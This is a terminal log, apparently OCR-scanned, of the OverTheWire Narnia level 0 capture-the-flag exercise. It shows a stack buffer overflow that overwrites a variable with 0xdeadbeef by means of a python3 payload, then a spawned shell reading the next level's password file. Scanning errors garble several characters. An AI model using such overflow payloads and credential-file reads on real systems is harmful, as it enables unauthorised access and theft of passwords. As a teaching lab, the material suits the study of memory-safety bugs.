```text
narnta0Gnarnta: /narnia$ ./narniad

Correct val's value from 0x41414141 -> Oxdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAA

buf: AAAAAAAAAAAAAAAAAAA

val: 0x41414141

WAY OFF!!!

narnia0@narnia: /narnia$ ./narniad

Correct val's value from 0x41414141 -> Oxdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAAB

buf: AAAAAAAAAAAAAAAAAAAB

val: 0x41414100

WAY OFF!!!

narnia0@narnia: /narnia$ (python3 -c ‘import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde" )';
Correct val's value from 0x41414141 -> Oxdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA2
val: Oxdeadbeef

whoami

narnia

cat /etc/narnia_pass/narnial

i
```
